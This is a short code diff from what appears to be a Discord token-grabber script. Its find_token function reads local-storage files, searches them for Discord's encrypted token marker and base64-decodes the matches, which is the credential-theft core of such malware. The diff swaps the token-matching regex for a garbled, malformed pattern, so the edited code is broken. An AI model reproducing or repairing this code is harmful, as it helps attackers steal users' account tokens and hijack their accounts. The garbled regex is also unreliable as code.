@@ -334,7 +334,7 @@ def find_token():
             try:
                 with open(os.path.join(local_storage_path, file), "r", errors="ignore") as f:
                     for line in f:
-                        matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
+                        matches = re.findall(r'dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*', line)
                         for match in matches:
                             try:
                                 encrypted_token = base64.b64decode(match)
